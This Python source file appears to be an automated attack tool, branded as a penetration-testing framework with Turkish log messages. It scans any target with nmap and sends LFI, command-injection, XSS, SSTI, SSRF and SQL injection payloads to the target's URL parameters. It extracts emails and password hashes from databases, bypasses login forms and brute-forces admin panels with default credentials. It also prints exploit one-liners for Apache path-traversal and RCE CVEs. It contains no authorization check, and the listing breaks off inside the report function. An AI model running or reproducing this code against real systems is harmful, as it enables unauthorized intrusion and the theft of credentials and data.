import requests
import re
import json
import time
import socket
import subprocess
import threading
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ANSI Renk Kodları
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_ascii_art():
    art = f"""{Colors.CYAN}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  {Colors.BOLD}██████╗ ██████╗ ███████╗███╗   ██╗████████╗███████╗{Colors.RESET}{Colors.CYAN}                        ║
║  {Colors.BOLD}██╔══██╗██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝{Colors.RESET}{Colors.CYAN}                        ║
║  {Colors.BOLD}██████╔╝██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗{Colors.RESET}{Colors.CYAN}                          ║
║  {Colors.BOLD}██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╗██║   ██║   ██╔══╝{Colors.RESET}{Colors.CYAN}                          ║
║  {Colors.BOLD}██║     ██║  ██║███████╗██║ ╚████║   ██║   ███████╗{Colors.RESET}{Colors.CYAN}                        ║
║  {Colors.BOLD}╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝{Colors.RESET}{Colors.CYAN}                        ║
║                                                                              ║
║  {Colors.BOLD}███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗{Colors.RESET}{Colors.CYAN}                      ║
║  {Colors.BOLD}██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝{Colors.RESET}{Colors.CYAN}                      ║
║  {Colors.BOLD}█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║{Colors.RESET}{Colors.CYAN}                         ║
║  {Colors.BOLD}██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║{Colors.RESET}{Colors.CYAN}                         ║
║  {Colors.BOLD}███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║{Colors.RESET}{Colors.CYAN}                         ║
║  {Colors.BOLD}╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝{Colors.RESET}{Colors.CYAN}                         ║
║                                                                              ║
║  {Colors.YELLOW}═══════════════════════════════════════════════════════════════════════{Colors.RESET}{Colors.CYAN}   ║
║                                                                              ║
║  {Colors.GREEN}[+] Advanced Penetration Testing & Exploitation Framework{Colors.RESET}{Colors.CYAN}                  ║
║  {Colors.GREEN}[+] Version 5.0 - Ultimate Edition with Nmap Integration{Colors.RESET}{Colors.CYAN}                  ║
║  {Colors.GREEN}[+] Telegram: @IIIlIIIIlIIlIIIIlI{Colors.RESET}{Colors.CYAN}                                          ║
║  {Colors.GREEN}[+] Full-Stack Security Assessment Tool{Colors.RESET}{Colors.CYAN}                                   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(art)

class AdvancedExploiter:
    def __init__(self, target_url, verbose=False, report_filename=None):
        self.target_url = target_url
        self.target_host = urlparse(target_url).netloc.split(':')[0]
        self.target_ip = self.resolve_ip(self.target_host)
        self.verbose = verbose
        self.report_filename = report_filename
        self.vulnerabilities = []
        self.exploited = []
        self.open_ports = []
        self.services = {}
        self.technologies = {}
        self.security_headers = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.BLUE,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "VULN": Colors.MAGENTA,
            "EXPLOIT": Colors.RED + Colors.BOLD,
            "SCAN": Colors.CYAN
        }
        color = colors.get(level, Colors.WHITE)
        print(f"{color}[{timestamp}] [{level}] {message}{Colors.RESET}")
    
    def resolve_ip(self, hostname):
        try:
            ip = socket.gethostbyname(hostname)
            self.log(f"Hostname resolved: {hostname} -> {ip}", "SUCCESS")
            return ip
        except:
            self.log(f"Hostname resolution failed: {hostname}", "ERROR")
            return hostname
    
    def add_vulnerability(self, vuln_type, severity, description, url):
        self.vulnerabilities.append({
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'url': url,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
    
    def add_exploit(self, vuln_type, method, payload, result):
        self.exploited.append({
            'type': vuln_type,
            'method': method,
            'payload': payload,
            'result': result,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })

    # ============ ADVANCED RECONNAISSANCE ============

    def detect_technologies(self):
        """Detect web technologies"""
        self.log("Teknoloji yığını tespiti yapılıyor...", "INFO")
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            html = response.text

            # Server header
            if 'Server' in headers:
                self.technologies['Server'] = headers['Server']
                self.log(f"Server: {headers['Server']}", "SUCCESS")
            
            # X-Powered-By header
            if 'X-Powered-By' in headers:
                self.technologies['X-Powered-By'] = headers['X-Powered-By']
                self.log(f"X-Powered-By: {headers['X-Powered-By']}", "SUCCESS")

            # Cookies for frameworks
            if 'Set-Cookie' in headers:
                cookies = headers['Set-Cookie']
                if 'wp-settings' in cookies:
                    self.technologies['CMS'] = 'WordPress'
                elif 'joomla' in cookies:
                    self.technologies['CMS'] = 'Joomla'
                elif 'laravel_session' in cookies:
                    self.technologies['Framework'] = 'Laravel'

            # HTML content analysis
            if 'wp-content' in html:
                self.technologies['CMS'] = 'WordPress'
            if 'Joomla!' in html:
                self.technologies['CMS'] = 'Joomla'
            if 'Drupal' in html:
                self.technologies['CMS'] = 'Drupal'
            if 'content="Magento' in html:
                self.technologies['CMS'] = 'Magento'
            if 'vbulletin' in html:
                self.technologies['Forum'] = 'vBulletin'
            if 'react' in html:
                self.technologies['JavaScript'] = 'React'
            
            if self.technologies:
                self.log(f"Tespit edilen teknolojiler: {self.technologies}", "SUCCESS")

        except Exception as e:
            self.log(f"Teknoloji tespiti sırasında hata: {e}", "ERROR")

    def check_security_headers(self):
        """Check for security headers"""
        self.log("Güvenlik başlıkları analiz ediliyor...", "INFO")
        try:
            response = self.session.get(self.target_url, timeout=10, allow_redirects=True)
            headers = response.headers
            
            required_headers = {
                'Strict-Transport-Security': 'CRITICAL',
                'Content-Security-Policy': 'HIGH',
                'X-Content-Type-Options': 'MEDIUM',
                'X-Frame-Options': 'MEDIUM',
                'Referrer-Policy': 'LOW',
                'Permissions-Policy': 'LOW'
            }
            
            for header, severity in required_headers.items():
                if header in headers:
                    self.security_headers[header] = {'status': 'Present', 'value': headers[header]}
                    self.log(f"{header} başlığı mevcut.", "SUCCESS")
                else:
                    self.security_headers[header] = {'status': 'Missing', 'value': None}
                    self.log(f"{header} başlığı EKSİK!", "WARNING")
                    self.add_vulnerability("Missing Security Header", severity, f"The '{header}' header is missing.", self.target_url)
        
        except Exception as e:
            self.log(f"Güvenlik başlığı analizi sırasında hata: {e}", "ERROR")

    def find_sensitive_files(self):
        """Find common sensitive files and directories"""
        self.log("Hassas dosyalar ve dizinler aranıyor...", "INFO")
        
        sensitive_paths = [
            '/.git/config', '/.env', '/.env.example', '/.aws/credentials',
            '/web.config', '/backup.sql', '/dump.sql', '/database.sql',
            '/app/config/database.yml', '/WEB-INF/web.xml', '/phpinfo.php',
            '/adminer.php', '/.DS_Store'
        ]
        
        for path in sensitive_paths:
            test_url = urljoin(self.target_url, path)
            try:
                response = self.session.get(test_url, timeout=5, allow_redirects=False)
                if response.status_code == 200 and len(response.content) > 0:
                    # Avoid false positives on generic 200 pages
                    if 'Not Found' not in response.text and '404' not in response.text:
                        self.log(f"HASSAS DOSYA BULUNDU: {test_url}", "EXPLOIT")
                        self.add_vulnerability("Sensitive File Exposure", "HIGH", f"Found sensitive file at: {path}", test_url)
            except:
                continue

    def brute_force_directories(self):
        """Brute force common directories"""
        self.log("Dizin kaba kuvvet saldırısı başlatılıyor (küçük liste)...", "INFO")
        
        common_dirs = [
            'admin', 'administrator', 'backup', 'blog', 'dev', 'git', 'img',
            'includes', 'js', 'login', 'panel', 'private', 'secret', 'test',
            'uploads', 'vendor', 'wordpress', 'wp-admin', 'wp-content'
        ]
        
        def check_dir(directory):
            test_url = urljoin(self.target_url, directory + '/')
            try:
                response = self.session.get(test_url, timeout=7, allow_redirects=False)
                if response.status_code in [200, 301, 302, 403]:
                    self.log(f"Dizin bulundu: {test_url} (Status: {response.status_code})", "SUCCESS")
                    self.add_vulnerability("Directory Listing/Exposure", "LOW", f"Found directory: {directory}", test_url)
            except:
                pass

        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_dir, common_dirs)
    
    # ============ NETWORK SCANNING ============
    
    def run_nmap_scan(self):
        """Run comprehensive Nmap scan"""
        self.log("NMAP taraması başlatılıyor...", "SCAN")
        
        # Check if nmap is available
        try:
            subprocess.run(['nmap', '--version'], capture_output=True, timeout=5)
        except:
            self.log("NMAP bulunamadı! Python port scanner kullanılacak.", "WARNING")
            return self.python_port_scan()
        
        self.log(f"Hedef: {self.target_ip}", "SCAN")
        
        # Quick scan for common ports
        self.log("Hızlı port taraması (Top 1000)...", "SCAN")
        try:
            result = subprocess.run(
                ['nmap', '-Pn', '-T4', '--top-ports', '1000', self.target_ip],
                capture_output=True,
                text=True,
                timeout=120
            )
            self.parse_nmap_output(result.stdout)
        except Exception as e:
            self.log(f"Nmap quick scan hatası: {e}", "ERROR")
        
        if self.open_ports:
            # Service detection on open ports
            self.log(f"{len(self.open_ports)} açık port bulundu. Servis tespiti yapılıyor...", "SCAN")
            ports_str = ','.join(map(str, self.open_ports[:20]))  # Limit to first 20
            
            try:
                result = subprocess.run(
                    ['nmap', '-Pn', '-sV', '-sC', '-p', ports_str, self.target_ip],
                    capture_output=True,
                    text=True,
                    timeout=180
                )
                self.parse_nmap_service_output(result.stdout)
            except Exception as e:
                self.log(f"Nmap service detection hatası: {e}", "ERROR")
            
            # Vulnerability scan
            self.log("Zafiyet taraması yapılıyor (NSE scripts)...", "SCAN")
            try:
                result = subprocess.run(
                    ['nmap', '-Pn', '--script', 'vuln', '-p', ports_str, self.target_ip],
                    capture_output=True,
                    text=True,
                    timeout=240
                )
                self.parse_nmap_vuln_output(result.stdout)
            except Exception as e:
                self.log(f"Nmap vulnerability scan hatası: {e}", "ERROR")
        
        return True
    
    def python_port_scan(self):
        """Fallback Python-based port scanner"""
        self.log("Python port scanner kullanılıyor...", "SCAN")
        
        common_ports = {
            20: 'FTP-DATA', 21: 'FTP', 22: 'SSH', 23: 'Telnet',
            25: 'SMTP', 53: 'DNS', 80: 'HTTP', 110: 'POP3',
            143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 
            6379: 'Redis', 8080: 'HTTP-ALT', 8443: 'HTTPS-ALT',
            27017: 'MongoDB', 1433: 'MSSQL', 8888: 'HTTP-ALT'
        }
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                if result == 0:
                    service = common_ports.get(port, 'Unknown')
                    self.log(f"Port {port} AÇIK - {service}", "SUCCESS")
                    self.open_ports.append(port)
                    self.services[port] = {'service': service, 'version': 'Unknown'}
                    return port
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(scan_port, port) for port in common_ports.keys()]
            for future in as_completed(futures):
                future.result()
        
        return True
    
    def parse_nmap_output(self, output):
        """Parse Nmap output for open ports"""
        lines = output.split('\n')
        for line in lines:
            if '/tcp' in line and 'open' in line:
                parts = line.split()
                port_info = parts[0]
                port = int(port_info.split('/')[0])
                service = parts[2] if len(parts) > 2 else 'unknown'
                self.open_ports.append(port)
                self.services[port] = {'service': service, 'version': 'unknown'}
                self.log(f"Port {port} AÇIK - {service}", "SUCCESS")
    
    def parse_nmap_service_output(self, output):
        """Parse Nmap service detection output"""
        lines = output.split('\n')
        current_port = None
        
        for line in lines:
            if '/tcp' in line and 'open' in line:
                parts = line.split()
                port = int(parts[0].split('/')[0])
                current_port = port
                
                # Extract version info
                version_info = ' '.join(parts[3:]) if len(parts) > 3 else 'unknown'
                if current_port in self.services:
                    self.services[current_port]['version'] = version_info
                    self.log(f"Port {current_port}: {version_info}", "INFO")
                    
                    # Check for known vulnerable versions
                    self.check_vulnerable_service(current_port, version_info)
    
    def parse_nmap_vuln_output(self, output):
        """Parse Nmap vulnerability scan output"""
        if 'VULNERABLE' in output:
            self.log("NMAP ZAFİYET TESPİT ETTİ!", "EXPLOIT")
            
            # Extract vulnerability details
            lines = output.split('\n')
            vuln_description = []
            for i, line in enumerate(lines):
                if 'VULNERABLE' in line or 'CVE-' in line:
                    vuln_description.append(line.strip())
                    self.log(line.strip(), "VULN")
                    
                    # Extract CVE
                    cve_match = re.search(r'CVE-\d{4}-\d{4,7}', line)
                    if cve_match:
                        cve = cve_match.group(0)
                        self.add_vulnerability("Network Vulnerability", "HIGH", f"Nmap detected: {cve}", self.target_url)
                        self.suggest_exploit(cve)
    
    def check_vulnerable_service(self, port, version_info):
        """Check for known vulnerable service versions"""
        vulnerable_patterns = {
            'Apache/2.4.49': ('CVE-2021-41773', 'Path Traversal', 'CRITICAL'),
            'Apache/2.4.50': ('CVE-2021-42013', 'Path Traversal & RCE', 'CRITICAL'),
            'nginx/1.18': ('CVE-2021-23017', 'DNS resolver', 'HIGH'),
            'OpenSSH 7.': ('Multiple CVEs', 'Authentication bypass possible', 'MEDIUM'),
            'ProFTPD 1.3.3': ('CVE-2010-4221', 'SQL Injection', 'HIGH'),
            'vsftpd 2.3.4': ('Backdoor', 'Known backdoor', 'CRITICAL'),
            'MySQL 5.': ('CVE-2012-2122', 'Authentication bypass', 'HIGH'),
        }
        
        for pattern, (cve, desc, severity) in vulnerable_patterns.items():
            if pattern.lower() in version_info.lower():
                self.log(f"ZAFIYET TESPİT EDİLDİ! Port {port}: {cve} - {desc}", "EXPLOIT")
                self.add_vulnerability("Vulnerable Service", severity, f"{cve}: {desc} on port {port}", self.target_url)
                self.suggest_exploit(cve)
    
    def suggest_exploit(self, cve):
        """Suggest exploits for CVE"""
        exploit_db = {
            'CVE-2021-41773': 'curl http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd',
            'CVE-2021-42013': 'curl http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d "echo Content-Type: text/plain; echo; id"',
            'CVE-2012-2122': 'for i in {1..1000}; do mysql -h target -u root --password=wrong; done',
            'CVE-2010-4221': 'Use sqlmap or manual SQL injection',
        }
        
        if cve in exploit_db:
            self.log(f"EXPLOIT ÖNERİSİ ({cve}):", "EXPLOIT")
            self.log(exploit_db[cve], "INFO")
            self.add_exploit("CVE Exploit", "Suggested", cve, exploit_db[cve])
    
    # LFI ve RCE Saldırıları
    def exploit_lfi_rce(self, urls=None):
        self.log("LFI/RCE zafiyetleri aranıyor...", "INFO")
        if not urls:
            urls = self.crawl_site(max_pages=20)
            
        lfi_payloads = [
            '../../../../../../etc/passwd',
            '..%2f..%2f..%2f..%2f..%2fetc/passwd',
            '../../../../../../windows/system.ini',
            '/etc/passwd%00', # Null byte injection
            'php://filter/read=convert.base64-encode/resource=index.php',
            'zip://../../../../../../var/log/apache2/access.log#shell.php', # Log poisoning assumption
        ]
        rce_payloads = [
            ';id', '&&whoami', '||ls -la', '`uname -a`',
            '| id', '$(whoami)', '%0a/usr/bin/id%0a', # Command injection with newline
        ]
        
        lfi_success_signatures = ['root:x:', 'win.ini', 'www-data', 'daemon']
        rce_success_signatures = ['uid=', 'gid=', 'Linux', 'Windows']
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                # --- LFI Testleri ---
                for payload in lfi_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        if any(sig in response.text for sig in lfi_success_signatures):
                            self.log(f"LFI ZAFİYETİ TESPİT EDİLDİ! URL: {test_url}", "EXPLOIT")
                            self.add_vulnerability("LFI (Local File Inclusion)", "CRITICAL", f"Parameter: {param}, Payload: {payload}", test_url)
                            return True
                    except:
                        continue
                
                # --- RCE Testleri ---
                for payload in rce_payloads:
                    test_params = params.copy()
                    
                    # RCE payload'larını mevcut parametre değerine ekleyerek test et
                    original_value = params[param][0]
                    test_params[param] = [original_value + payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        if any(sig in response.text for sig in rce_success_signatures):
                            self.log(f"RCE (COMMAND INJECTION) ZAFİYETİ TESPİT EDİLDİ!", "EXPLOIT")
                            self.add_vulnerability("RCE (Remote Code Execution)", "CRITICAL", f"Parameter: {param}, Payload: {test_params[param][0]}", test_url)
                            return True
                    except:
                        continue
        return False

    # (Bu metodu run_full_penetration_test içine eklemeyi unutma!)

    def exploit_xss(self, urls=None):
        self.log("XSS zafiyetleri aranıyor...", "INFO")
        if not urls:
            urls = self.crawl_site(max_pages=20)
            
        # Reflected/Stored XSS için temel payload'lar
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<IMG SRC="javascript:alert(\'XSS\');">',
            '<svg/onload=alert("XSS")>',
            '<details/open/ontoggle=alert("XSS")>',
            '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            '&#x3C;script&#x3E;alert(&#x27;XSS&#x27;)&#x3C;/script&#x3E;', # HTML Entities
            '<h1>XSS_TEST_MARKER</h1>'
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in xss_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        
                        # Payload'ın direkt olarak HTML içinde yansıdığını kontrol et
                        if payload in response.text:
                            # Ancak sadece payload yansıması yetmez, filtreden geçip geçmediğine bak
                            if '<script>alert("XSS")</script>' in response.text and not response.text.count('alert("XSS")') == 1:
                                # Bu bir basit yansıma, güvenlik filtresi yok
                                self.log(f"XSS ZAFİYETİ TESPİT EDİLDİ! Param: {param}", "EXPLOIT")
                                self.add_vulnerability("XSS (Reflected)", "HIGH", f"Parameter: {param}, Payload: {payload}", test_url)
                                return True
                            
                            if 'XSS_TEST_MARKER' in response.text:
                                self.log(f"XSS ZAFİYETİ TESPİT EDİLDİ! (HTML Yansıma) Param: {param}", "EXPLOIT")
                                self.add_vulnerability("XSS (Reflected/Stored)", "HIGH", f"Parameter: {param}, Payload: {payload}", test_url)
                                return True
                    except:
                        continue
        return False

    def exploit_ssti(self, urls=None):
        self.log("SSTI zafiyetleri aranıyor...", "INFO")
        if not urls:
            urls = self.crawl_site(max_pages=20)

        # {7*7} formatında payload'lar ve beklenen sonuçlar
        ssti_payloads = {
            '{{7*7}}': '49',
            '${7*7}': '49',
            '<%= 7*7 %>': '49',
            '#{7*7}': '49',
            '*{7*7}': '49',
        }

        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param in params:
                for payload, expected_result in ssti_payloads.items():
                    test_params = params.copy()
                    original_value = params[param][0]
                    test_params[param] = [original_value + payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    try:
                        response = self.session.get(test_url, timeout=10)
                        
                        # Eğer payload'ın sonucu (örn: 49) yanıtta görünüyorsa, zafiyet var demektir.
                        if expected_result in response.text:
                            self.log(f"SSTI ZAFİYETİ TESPİT EDİLDİ! Param: {param}", "EXPLOIT")
                            self.add_vulnerability("SSTI (Server-Side Template Injection)", "CRITICAL", f"Parameter: {param}, Payload: {payload}", test_url)
                            return True
                    except Exception:
                        continue
        return False

    def exploit_ssrf(self, urls=None):
        self.log("SSRF zafiyetleri aranıyor...", "INFO")
        if not urls:
            urls = self.crawl_site(max_pages=20)

        ssrf_payloads = {
            'http://127.0.0.1:80': 'Localhost',
            'http://localhost:22': 'Local SSH Port',
            'http://169.254.169.254/latest/meta-data/': 'AWS Metadata',
            'http://metadata.google.internal/computeMetadata/v1/': 'GCP Metadata',
            'file:///etc/passwd': 'Local File Access',
        }
        
        ssrf_signatures = ['ssh', 'root:x:', 'instance-id', 'computeMetadata']

        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param in params:
                original_value = params[param][0]
                if not urlparse(original_value).scheme in ['http', 'https']:
                    continue # Sadece URL içeren parametreleri test et

                for payload, description in ssrf_payloads.items():
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    try:
                        response = self.session.get(test_url, timeout=10, allow_redirects=False)
                        
                        # Yanıt içeriğinde veya başlıklarda ipucu ara
                        if any(sig in response.text for sig in ssrf_signatures) or 'Server' in response.headers:
                            self.log(f"SSRF ZAFİYETİ TESPİT EDİLDİ! ({description})", "EXPLOIT")
                            self.add_vulnerability("SSRF (Server-Side Request Forgery)", "CRITICAL", f"Parameter: {param}, Payload: {payload}", test_url)
                            return True
                    except requests.exceptions.ReadTimeout:
                        # Zaman aşımı, bir porta bağlanmaya çalıştığını gösterebilir (kör SSRF)
                        self.log(f"Potansiyel KÖR SSRF! ({description}) - İstek zaman aşımına uğradı.", "EXPLOIT")
                        self.add_vulnerability("Blind SSRF", "HIGH", f"Parameter: {param}, Payload: {payload}", test_url)
                        return True
                    except Exception:
                        continue
        return False
    
    # ============ WEB EXPLOITATION ============
    
    def crawl_site(self, max_pages=50):
        self.log("Web sitesi taranıyor ve parametreler tespit ediliyor...", "INFO")
        visited = set()
        to_visit = [self.target_url]
        vulnerable_urls = []
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
            
            visited.add(url)
            try:
                response = self.session.get(url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                parsed = urlparse(url)
                if parsed.query:
                    vulnerable_urls.append(url)
                    self.log(f"Parametreli URL: {url}", "SUCCESS")
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    
                    if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                        if full_url not in visited:
                            to_visit.append(full_url)
            except:
                continue
        
        self.log(f"{len(visited)} sayfa tarandı, {len(vulnerable_urls)} parametreli URL bulundu", "INFO")
        return vulnerable_urls
    
    def exploit_sql_injection(self, urls=None):
        self.log("SQL Injection exploitation başlatılıyor...", "INFO")
        
        if not urls:
            urls = self.crawl_site()
        
        sql_payloads = [
            ("'", "error"),
            ("\"", "error"),
            ("' OR '1'='1", "bypass"),
            ("' oR '1'='1", "bypass"),
            ("' OR 1=1--", "bypass"),
            ("' OR 1=1#", "bypass"),
            ("' OR 1=1/*", "bypass"),
            ("' uNiOn sElEcT NULL,NULL,NULL--", "union"),
            ("' UNION SELECT version(),database(),user()--", "extract"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))b)", "time-based"),
            ("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "tables"),
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload, check_type in sql_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        
                        if check_type == "error":
                            if re.search(r'(SQL syntax|mysql_|PostgreSQL|ORA-\d+)', response.text, re.I):
                                self.log(f"SQL Injection BULUNDU! Param: {param}", "EXPLOIT")
                                self.add_vulnerability("SQL Injection", "CRITICAL", f"Parameter: {param}", test_url)
                                self.extract_sql_data(url, param)
                                return True
                        
                        elif check_type == "extract":
                            if re.search(r'\d+\.\d+\.\d+', response.text):
                                self.log(f"VERİTABANI BİLGİSİ ÇIKARILDI!", "EXPLOIT")
                                data = response.text[:500]
                                self.add_exploit("SQL Injection", "Data Extraction", payload, data)
                                self.log(data, "SUCCESS")
                                return True
                    except:
                        continue
        
        return False
    
    def extract_sql_data(self, url, param):
        """Extract database information"""
        extraction_payloads = [
            "' UNION SELECT version(),database(),user(),NULL--",
            "' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--",
            "' UNION SELECT CONCAT(username,':',password),NULL,NULL,NULL FROM users--",
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for payload in extraction_payloads:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', response.text)
                hashes = re.findall(r'[a-fA-F0-9]{32,64}', response.text)
                
                if emails:
                    self.log(f"EMAIL'LER BULUNDU: {emails[:5]}", "EXPLOIT")
                    self.add_exploit("SQL Injection", "Email Extraction", payload, str(emails[:5]))
                
                if hashes:
                    self.log(f"HASH'LER BULUNDU: {hashes[:3]}", "EXPLOIT")
                    self.add_exploit("SQL Injection", "Hash Extraction", payload, str(hashes[:3]))
            except:
                continue
    
    def find_admin_panel(self):
        self.log("Admin paneli aranıyor...", "INFO")
        
        admin_paths = [
            '/admin', '/admin/', '/login', '/login.php', '/admin.php',
            '/administrator', '/wp-admin', '/cpanel', '/dashboard',
            '/admin/login', '/admin/login.php', '/admincp', '/modcp',
            '/panel', '/yonetim.php', '/yonetici.php', '/admin_panel.php',
        ]
        
        found_panels = []
        
        for path in admin_paths:
            test_url = urljoin(self.target_url, path)
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    if any(i in response.text.lower() for i in ['login', 'password', 'username', 'admin']):
                        self.log(f"ADMİN PANELİ BULUNDU: {test_url}", "EXPLOIT")
                        found_panels.append(test_url)
                        self.add_vulnerability("Admin Panel Exposed", "MEDIUM", path, test_url)
            except:
                continue
        
        return found_panels
    
    def brute_force_admin(self, admin_urls=None):
        self.log("Admin brute force başlatılıyor...", "INFO")
        
        if not admin_urls:
            admin_urls = self.find_admin_panel()
        
        if not admin_urls:
            return False
        
        credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '12345'),
            ('admin', 'admin123'), ('root', 'root'), ('administrator', 'administrator'),
        ]
        
        sql_bypasses = [
            ("admin' OR '1'='1", "anything"),
            ("' OR 1=1--", "anything"),
            ("admin'--", "anything"),
        ]
        
        for admin_url in admin_urls:
            try:
                response = self.session.get(admin_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    form_details = self.get_form_details(form)
                    form_url = urljoin(admin_url, form_details["action"])
                    
                    username_field = None
                    password_field = None
                    
                    for input_tag in form_details["inputs"]:
                        if input_tag["name"] and ('user' in input_tag["name"].lower() or 'email' in input_tag["name"].lower()):
                            username_field = input_tag["name"]
                        elif input_tag["type"] == "password":
                            password_field = input_tag["name"]
                    
                    if not username_field or not password_field:
                        continue
                    
                    # Try SQL injection bypass
                    self.log("SQL Injection bypass deneniyor...", "INFO")
                    for username, password in sql_bypasses:
                        data = {username_field: username, password_field: password}
                        
                        try:
                            res = self.session.post(form_url, data=data, timeout=10)
                            if any(i in res.text.lower() for i in ['welcome', 'dashboard', 'logout']):
                                self.log(f"SQL BYPASS BAŞARILI! User: {username}", "EXPLOIT")
                                self.add_exploit("Admin Login", "SQL Injection", f"{username}/{password}", "Success")
                                return True
                        except:
                            continue
                    
                    # Try common credentials
                    for username, password in credentials:
                        data = {username_field: username, password_field: password}
                        try:
                            res = self.session.post(form_url, data=data, timeout=10)
                            if any(i in res.text.lower() for i in ['welcome', 'dashboard', 'logout']):
                                self.log(f"GİRİŞ BAŞARILI! {username}/{password}", "EXPLOIT")
                                self.add_exploit("Admin Login", "Brute Force", f"{username}/{password}", "Success")
                                return True
                        except:
                            continue
            except:
                continue
        
        return False
    
    def get_form_details(self, form):
        details = {}
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            if input_name:
                inputs.append({"type": input_type, "name": input_name})
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details
    
    def generate_report(self):
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}                    PENETRATION TEST RAPORU                     {Colors.RESET}")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}\n")
        
        print(f"{Colors.BOLD}Hedef:{Colors.RESET} {self.target_url}")
        print(f"{Colors.BOLD}IP Adresi:{Colors.RESET} {self.target_ip}")
        print(f"{Colors.BOLD}Tarih:{Colors.RESET} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Colors.BOLD}Açık Portlar:{Colors.RESET} {len(self.open_ports)}")
